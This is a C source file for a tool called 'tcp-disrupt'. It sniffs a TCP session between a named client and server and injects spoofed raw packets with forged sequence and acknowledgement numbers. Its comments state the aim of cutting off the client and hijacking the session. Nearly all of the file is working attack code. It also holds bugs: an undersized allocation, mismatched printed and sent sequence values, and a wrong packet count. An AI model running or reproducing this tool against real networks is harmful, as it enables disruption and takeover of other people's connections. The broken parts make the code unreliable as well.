#include "tcp-disrupt.h"

static const char           *optString  = "p:c:s:i:h?";
static const struct option  longOpts[]  = {
    {   "client",     required_argument,  NULL,   'c'   },
    {   "server",     required_argument,  NULL,   's'   },
    {   "port",       required_argument,  NULL,   'p'   },
    {   "interface",  required_argument,  NULL,   'i'   },
    {   NULL,         no_argument,        NULL,   0     }
};


int main(int argc, char **argv) {
    int     opt         = 0;
    int     longIndex   = 0;

    sniffArgs *sniffArgs;
    if( !(sniffArgs = malloc(sizeof(sniffArgs))) ){
        fprintf(stderr, "[FAIL] Failed to allocate memory. Quitting.\n");
        exit(-1);
    } else memset(sniffArgs, 0, sizeof(struct sniffArgs));

    while((opt = getopt_long(argc, argv, optString, longOpts, &longIndex)) != -1) {
        switch( opt ) {
            case 'c':
                sniffArgs->clientIP = optarg; 
                break;
            case 's':
                sniffArgs->serverIP = optarg; 
                break;
            case 'i':
                sniffArgs->interface = optarg;
                break;
            case 'p':
                sniffArgs->serverPort = atoi(optarg); 
                break;     
            case 'h':   /* h or --help */
            case '?':
                display_usage(argv[0]);
                exit(EXIT_SUCCESS);
                break;     
            default:
                break;
        }
    }

    int snifferResult;
    if ( (snifferResult = sniffNetwork(sniffArgs)) ){
        fprintf(stderr, "[FAIL] Failed to sniff the network. Result Code: [ %d ]. Quitting.\n", snifferResult);
        exit(1);
    } 
    return 0;
}


/**
 * Prints out the usage string of this program.
 * @param name String containing the name of the program.
 */
void display_usage(char *name) {
    printf("%s --client client_ip --server server_ip [--port server_port] [--interface interface]\n", name);
}


/**
 * Throw off the connection between two hosts in an already established TCP session.
 * The function should save the state of the sequence and ack numbers between calls.
 *
 * The end goal is to leave the source IP without a connection and we will hijack
 * the connection state with the destination, continuing to send data.
 *
 * If this function is currently attempting to disrupt the session, it will simply return to it's caller after the 
 * attempt to disrupt is made.
 *
 * If this function has successfully disrupted the session, it should handle the events that
 * take place after the connection has been hijacked.
 *
 * Once the function has been hijacked, and the desired actions have been taken on the hijacked session, this function should exit tcp-disrupt. 
 */
void disrupt_session(void *sniffedPacket) {
    struct ip *ipHeader         = (struct ip*)sniffedPacket;
    void *headerPtr             = sniffedPacket + (ipHeader->ip_hl * 4);
    struct tcphdr *tcpHeader    = (struct tcphdr *)headerPtr;

    struct sockaddr_in addr_in;
    addr_in.sin_family          = AF_INET;
    addr_in.sin_port            = tcpHeader->source;
    inet_pton(AF_INET, inet_ntoa(ipHeader->ip_src), &(addr_in.sin_addr));

    int sizeOfPacket            = sizeof(struct iphdr) + sizeof(struct tcphdr) + 12 + 1;
    void *packet                = malloc(sizeOfPacket);
    uint32_t ack_inc            = 1;       // Amount to increase ack by
    uint32_t seq_inc            = 0;       // Amount to increase seq by
    int sock                    = -1;       // Socket FD
    int one                     = 1;        // ??????????????

    //Raw socket without any protocol-header inside
    if((sock = socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
        perror("Error while creating socket\n");
        exit(-1);
    }
    //Set option IP_HDRINCL (headers are included in packet)
    if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&one, sizeof(one)) < 0) {
        perror("Error while setting socket options\n");
        exit(-1);
    }

    printf("\n\nReceived {");
    printf("\"srcIP\":\"%s\", ",    inet_ntoa(ipHeader->ip_src));
    printf("\"dstIP\":\"%s\", ",    inet_ntoa(ipHeader->ip_dst));
    printf("\"dstPort\":%u, ",      ntohs(tcpHeader->dest));
    printf("\"srcPort\":%u, ",      ntohs(tcpHeader->source));
    printf("\"SYN\":%d, ",          tcpHeader->syn);
    printf("\"ACK\":%d, ",          tcpHeader->ack);
    printf("\"PSH\":%d, ",          tcpHeader->psh);
    printf("\"RST\":%d, ",          tcpHeader->rst);
    printf("\"ACK_NUM\":%u, ",      ntohl(tcpHeader->ack_seq));
    printf("\"SYN_NUM\":%u",        ntohl(tcpHeader->seq));
    printf("}\n\n");

    printf("Sending {");
    printf("\"srcIP\":\"%s\", ",    inet_ntoa(ipHeader->ip_dst));
    printf("\"dstIP\":\"%s\", ",    inet_ntoa(ipHeader->ip_src));
    printf("\"dstPort\":%u, ",      ntohs(tcpHeader->source));
    printf("\"srcPort\":%u, ",      ntohs(tcpHeader->dest));
    printf("\"SYN\":%d, ",          SYN_OFF);
    printf("\"ACK\":%d, ",          ACK_ON);
    printf("\"PSH\":%d, ",          PSH_ON);
    printf("\"RST\":%d, ",          RESET_OFF);
    printf("\"ACK_NUM\":%u, ",      ntohl(tcpHeader->seq) + seq_inc);
    printf("\"SYN_NUM\":%u, ",      ntohl(tcpHeader->ack_seq) + ack_inc);
    printf("\"data\":\"%s\"",       "X");
    printf("}\n\n");

    int packetCountdown = 1;
    while(packetCountdown--){

        char *dstTemp = inet_ntoa(ipHeader->ip_dst);
        char *dstAddress = malloc(strlen(dstTemp) + 1);
        strncpy(dstAddress, dstTemp, strlen(dstTemp) + 1);

        char *srcTemp = inet_ntoa(ipHeader->ip_src);
        char *srcAddress = malloc(strlen(srcTemp) + 1);
        strncpy(srcAddress, srcTemp, strlen(srcTemp) + 1);

        printf("filling with ipHdr->saddr = %s\n", dstAddress);
        printf("filling with ipHdr->daddr = %s\n", srcAddress);

        fill_packet(dstAddress,                             // Source IP Address
                    srcAddress,                             // Destination IP Address
                    ntohs(tcpHeader->source),               // Destination Port
                    ntohs(tcpHeader->dest),                 // Source Port
                    SYN_OFF,                                // SYN Flag
                    ACK_ON,                                 // ACK Flag
                    PSH_ON,                                 // PSH Flag
                    ntohl(tcpHeader->ack_seq) + seq_inc,    // Sequence Number
                    ntohl(tcpHeader->seq) + ack_inc,        // Acknowledgement Number
                    RESET_OFF,                              // RST Flag
                    "X",                                    // Data
                    packet,                                 // Packet to fill
                    sizeOfPacket);                          // Total size of packet

        // Send out the packet
        printf("Sending Packet %02d of %02d! Result: %d\n", 6-packetCountdown, 5, send_packet(sock, packet, addr_in));

        free(dstAddress);
        free(srcAddress);
    }
}
